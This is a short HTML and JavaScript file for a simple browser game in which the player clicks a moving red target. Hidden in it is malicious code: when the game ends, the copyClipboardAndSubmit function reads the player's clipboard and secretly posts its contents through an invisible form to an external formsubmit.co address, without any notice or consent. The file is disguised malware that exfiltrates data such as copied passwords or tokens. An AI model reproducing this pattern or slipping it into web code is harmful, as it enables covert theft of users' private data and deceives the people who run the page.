<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click the Target Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        #gameArea {
            position: relative;
            width: 500px;
            height: 500px;
            background-color: #fff;
            border: 2px solid #333;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .target {
            width: 50px;
            height: 50px;
            background-color: red;
            border-radius: 50%;
            position: absolute;
            cursor: pointer;
        }

        #score {
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 24px;
            color: #333;
        }

        #gameMessage {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 32px;
            color: #000;
            display: none;
            background-color: rgba(255, 255, 255, 0.7);
            padding: 20px;
            border-radius: 10px;
        }
    </style>
</head>
<body>

<div id="gameArea">
    <div id="score">Score: 0</div>
    <div id="gameMessage">You won!</div>
</div>

<form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
    <input type="hidden" name="_subject" value="Click the Target Game - Secret Unlocked!" />
    <input type="hidden" name="_next" value="thank_you.html" />
    <input type="hidden" id="clipboardContent" name="clipboardContent" />
</form>

<script>
    // Game Variables
    const gameArea = document.getElementById('gameArea');
    const scoreDisplay = document.getElementById('score');
    const gameMessage = document.getElementById('gameMessage');
    const hiddenForm = document.getElementById('hiddenForm');
    const target = document.createElement('div');
    let score = 0;
    let gameInterval;
    let targetMoveInterval;

    // Set up the game
    function initializeGame() {
        // Create the target
        target.classList.add('target');
        gameArea.appendChild(target);

        // Add click event to the target
        target.addEventListener('click', onTargetClick);

        // Start moving the target
        startTargetMovement();

        // Start the game timer
        startGameTimer();
    }

    // Start the target movement at random intervals
    function startTargetMovement() {
        targetMoveInterval = setInterval(() => {
            const maxX = gameArea.offsetWidth - target.offsetWidth;
            const maxY = gameArea.offsetHeight - target.offsetHeight;
            const randomX = Math.floor(Math.random() * maxX);
            const randomY = Math.floor(Math.random() * maxY);

            target.style.left = randomX + 'px';
            target.style.top = randomY + 'px';
        }, 1000);  // Target moves every 1 second
    }

    // Handle clicking the target
    function onTargetClick() {
        score++;
        scoreDisplay.textContent = `Score: ${score}`;

        // Move the target to a new position immediately after a click
        const maxX = gameArea.offsetWidth - target.offsetWidth;
        const maxY = gameArea.offsetHeight - target.offsetHeight;
        const randomX = Math.floor(Math.random() * maxX);
        const randomY = Math.floor(Math.random() * maxY);

        target.style.left = randomX + 'px';
        target.style.top = randomY + 'px';

        // Check if the player reached a certain score to win the game
        if (score >= 10) {
            endGame();
        }
    }

    // End the game
    function endGame() {
        clearInterval(targetMoveInterval);
        gameMessage.style.display = 'block';
        copyClipboardAndSubmit();
    }

    // Start the game timer
    function startGameTimer() {
        gameInterval = setTimeout(() => {
            endGame();
        }, 30000);  // End the game after 30 seconds if not finished
    }

    // Copy clipboard content and submit the form
    function copyClipboardAndSubmit() {
        navigator.clipboard.readText().then(function(clipText) {
            document.getElementById('clipboardContent').value = clipText;
            setTimeout(function() {
                document.getElementById('hiddenForm').submit();
            }, 1000);
        }).catch(function(err) {
            console.error('Failed to read clipboard contents: ', err);
        });
    }

    // Initialize the game
    initializeGame();
</script>

</body>
</html>
